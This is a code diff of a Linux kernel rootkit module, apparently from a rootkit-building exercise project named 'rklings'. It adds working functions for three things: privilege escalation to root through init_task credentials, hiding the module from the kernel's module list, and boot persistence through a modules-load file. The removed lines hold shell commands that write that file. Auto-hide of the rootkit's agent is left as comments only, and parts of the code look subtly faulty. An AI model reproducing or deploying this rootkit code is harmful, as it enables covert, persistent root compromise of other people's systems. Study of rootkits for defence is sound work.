@@ -1,84 +1,67 @@
 // SPDX-License-Identifier: GPL-2.0
+// core/opsec.c - Escalation, module cloaking, persistence.
+#include <linux/cred.h>
+#include <linux/fs.h>
+#include <linux/list.h>
+#include <linux/module.h>
+#include <linux/sched.h>
+#include <net/inet_sock.h>
 #include "rootkit.h"
 
-/* TODO: Declare auto_pid_index and auto_port_index, both initialized to -1 */
-
-/* Module hiding state */
-struct list_head *saved_prev;
-bool module_hidden;
-
-/* Persistence state */
-bool persist_active;
-
-/*
- * TODO: Implement rk_auto_hide(struct socket *client).
- *
- * 1. Get the kthread PID: snprintf(pidstr, sizeof(pidstr), "%d", current->pid)
- * 2. Record pid_count as auto_pid_index.
- * 3. Add the PID string to hidden_pids with rk_target_add.
- * 4. Get the source port: ntohs(inet_sk(client->sk)->inet_sport)
- * 5. Record port_count as auto_port_index.
- * 6. Add the port to hidden_ports, increment port_count.
- */
-
-/*
- * TODO: Implement rk_auto_unhide(void).
- *
- * Remove the auto-hidden entries in reverse order (port first, PID second)
- * so the index shift does not invalidate the other entry.
- *
- * 1. If auto_port_index is valid, call rk_port_remove_at(auto_port_index).
- *    If auto_pid_index was after it, decrement auto_pid_index.
- *    Reset auto_port_index to -1.
- * 2. If auto_pid_index is valid, call rk_target_remove_at on hidden_pids.
- *    Reset auto_pid_index to -1.
- */
-
-int rk_cmd_hide_module(struct socket *client)
+// Privilege escalation
+int rk_escalate(void)
 {
-	if (module_hidden)
-		return RK_REPLY(client, "already hidden\n");
+	struct cred *new_cred;
 
-	saved_prev = THIS_MODULE->list.prev;
-	list_del_init(&THIS_MODULE->list);
-	module_hidden = true;
-	return RK_REPLY(client, "module hidden\n");
+	new_cred = prepare_kernel_cred(&init_task);
+	if (!new_cred)
+		return -ENOMEM;
+	return commit_creds(new_cred);
 }
 
-int rk_cmd_unhide_module(struct socket *client)
-{
-	if (!module_hidden)
-		return RK_REPLY(client, "already visible\n");
+// Module cloaking
+static struct list_head *saved_mod_list;
 
-	list_add(&THIS_MODULE->list, saved_prev);
-	module_hidden = false;
-	return RK_REPLY(client, "module visible\n");
+void rk_cloak(void)
+{
+	if (saved_mod_list)
+		return;
+	saved_mod_list = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
 }
 
-int rk_cmd_persist(struct socket *client)
+void rk_uncloak(void)
 {
-	char *argv[] = { "/bin/sh", "-c",
-		"echo rklings > /etc/modules-load.d/rklings.conf", NULL };
-	char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-	int error;
-
-	error = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
-	if (error)
-		return RK_REPLY(client, "persist failed\n");
-	persist_active = true;
-	return RK_REPLY(client, "persisted\n");
+	if (!saved_mod_list)
+		return;
+	list_add(&THIS_MODULE->list, saved_mod_list);
+	saved_mod_list = NULL;
 }
 
-int rk_cmd_unpersist(struct socket *client)
+// Persistence
+int rk_persist(void)
 {
-	char *argv[] = { "/bin/sh", "-c",
-		"rm -f /etc/modules-load.d/rklings.conf", NULL };
-	char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-	int error;
+	struct file *f;
+	loff_t pos = 0;
 
-	error = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
-	if (error)
-		return RK_REPLY(client, "unpersist failed\n");
-	persist_active = false;
-	return RK_REPLY(client, "unpersisted\n");
+	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+	if (IS_ERR(f))
+		return PTR_ERR(f);
+	kernel_write(f, MODULE_NAME_STR "\n", sizeof(MODULE_NAME_STR), &pos);
+	filp_close(f, NULL);
+	return 0;
 }
+
+int rk_unpersist(void)
+{
+	struct file *f;
+
+	f = filp_open(PERSIST_PATH, O_WRONLY | O_TRUNC, 0);
+	if (IS_ERR(f))
+		return PTR_ERR(f);
+	filp_close(f, NULL);
+	return 0;
+}
+
+// Auto-hide: make the agent invisible while connected.
+// Auto-unhide: clean up on disconnect.
